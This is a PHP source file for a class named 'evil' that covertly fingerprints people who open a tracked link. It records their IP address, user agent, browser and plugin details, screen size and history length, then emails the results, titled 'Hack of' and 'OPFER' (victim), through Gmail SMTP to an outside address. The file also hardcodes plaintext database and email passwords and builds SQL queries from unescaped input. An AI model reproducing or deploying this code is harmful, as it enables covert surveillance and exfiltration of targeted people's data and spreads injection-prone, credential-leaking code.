<?php

require "PHPMailer-master/PHPMailerAutoload.php";

class evil {

    private function returnMailer(){
        return $mail = new PHPMailer();
    }

    /**
     * @return bool|mysqli
     */
    public function connect(){
        // TODO: URGENT! Update connection information.
        $db = mysqli_connect("localhost", 'xandtecc_cjdm', 'mou12345', 'xandtecc_lolling');
        $db->set_charset("utf8");
        if ($db->connect_errno > 0){
            return false;
        } else{
            return $db;
        }
    }

    public function updateDatabase($hash, $now){
        $query = "UPDATE opponents SET visited = '$now', visited_link = visited_link + 1 WHERE hash='$hash'";
        return mysqli_query($this->connect(), $query);
    }


    /**
     * @return mixed
     */
    public function getUserIP()
    {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];

        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }

        return $ip;
    }

    /**
     * @param string $hash
     * @return bool
     */
    public function getData($hash){
        $query = "SELECT * FROM opponents WHERE hash='$hash' LIMIT 1";
        if ($result = mysqli_query($this->connect(), $query)){
            while ($row = mysqli_fetch_row($result)){

                    $data['id'] = $row[0];
                    $data['name'] = $row[1];
                    $data['phone_number'] = $row[2];
                    $data['hash'] = $row[3];
                    $data['phone'] = $row[4];
                    $data['has_whatsapp'] = $row[5];
                    $data['visited'] = $row[6];
                    $data['visited_link'] = $row[7];
            }
            return $data;
        } else {
            return false;
        }
    }

    public function test(){
        echo "It works, dummy!";
    }

   public function sendMail($now){
       // Data from database
       $hash = $_SESSION['hash'];
       /*
       $data = $this->getData($hash);

       $this->updateDatabase($hash, $now);
        */
       $mail=$this->returnMailer();

       //PHP
       $browser = get_browser(null, true);

       //AJAX

       foreach ($browser as $key=>$value){
           if (!isset($browserString)){
               $browserString = "";
           }
           $browserString = $browserString . "<p>" . $key . " = " . $value . "</p>";
       }

       if(isset($_SESSION['HistroyLength'])){
           $historylength = $_SESSION['HistroyLength'];
       } else {
           $historylength = "Undefined";
       }

       if (isset($_SESSION['Language'])){
           $JSlanguages = $_SESSION['Language'];
       } else {
           $JSlanguages = "Undefined";
       }

       if (isset($_SESSION['JavaEnabled'])){
           $javaEnabled = $_SESSION['JavaEnabled'];
       } else {
           $javaEnabled = false;
       }

       if (isset($_SESSION['ScreenHeight']) & isset($_SESSION['ScreenWidth'])){
           $screenResolution = $_SESSION['ScreenHeight'] . "x" . $_SESSION['ScreenWidth'];
       } else {
           $screenResolution = "Undefined";
       }

       if (isset($_SESSION['UserPlattform'])){
           $userPlattform = $_SESSION['UserPlattform'];
       } else {
           $userPlattform = "Undefined";
       }

       if (isset($_SESSION['AppName'])){
           $appName = $_SESSION['AppName'];
       } else {
           $appName = "Undefined";
       }

       if (isset($_SESSION['CookiesEnabled'])){
           $cookiesEnabled = $_SESSION['CookiesEnabled'];
       } else {
           $cookiesEnabled = "Undefined";
       }

       if (isset($_SESSION['Plugins'])){
           $pluginsString = $_SESSION['Plugins'];
       } else {
           $pluginsString = "Undefined";
       }

       /*
       // Validate variables
       if($data['has_whatsapp'] == 1){
           $whatsapp = "Ja";
       } else if ($data['has_whatsapp'] == 0) {
           $whatsapp = "Nein";
       }
        */
       if (isset($_SERVER['HTTP_USER_AGENT'])){
           $userAgent = $_SERVER['HTTP_USER_AGENT'];
       } else {
           $userAgent = "Undefined";
       }

       if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
           $PHPlanguages = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
       } else {
           $PHPlanguages = "Undefined";
       }


        // Mailserver setup
       $mail->isSMTP();
       $mail->Host = 'ssl://smtp.gmail.com';
       $mail->SMTPAuth = true;
       $mail->Username = 'veryevil.messenger@gmail.com';
       $mail->Password = 'Zbb01325';
       $mail->SMTPSecure = 'tls';
       $mail->Port = '465';

        //Mailer info
       $mail->From = 'Info@Baum.com';
       $mail->FromName = 'Baum';
       $mail->addAddress('egitarristashura@gmail.com');

        //Mail
       $mail->isHTML(true);
       $mail->Subject = 'Hack of ' /*. $data['name']*/;
       $mail->Body =             '<html>
            <head>
                <meta charset="UTF-8">
                <title></title>
            </head>
            <body>
            <h1>OPFER: ' . /*$data['name'] .*/'</h1>
            <h2>Nr.: ' . /*$data['phone_number'] .*/'</h2>
            <h2>Gerät: ' . /*$data['phone'] .*/'</h2>
            <h2>Hat Whatsapp: ' ./* $whatsapp .*/'</h2>
            <h2>Besucht am: ' . $now .'</h2>
            <h2>Wie oft besucht: '. /*$data['visited_link'] .*/'</h2>
            <h2>Info from PHP</h2>
            <p>IP = '. $this->getUserIP() .'</p>
            <p>User agent = '. $userAgent .'</p>
            <p>Accepted languages = '. $PHPlanguages .'</p>
            <p><b>Browser info</b></p>
            '. $browserString .'
            <br/>
            <h2>Info from js</h2>
            <p>History length = '. $historylength .'</p>
            <p>Language = '. $JSlanguages .'</p>
            <p>Java is enabled: '. $javaEnabled .'</p>
            <p>Screen resolution: '. $screenResolution .'</p>
            <p>User plattform: '. $userPlattform.'</p>
            <p>App name: '. $appName .'</p>
            <p>Cookies enabled: '. $cookiesEnabled .'</p>
            <p><b>Plugins</b></p>
            '.$pluginsString.'
            </body>
            </html>';

       if($mail->send()){
           echo "It should have works";
       } else {
           echo "Nyaaahh... There is something wrong";
       }
   }
} 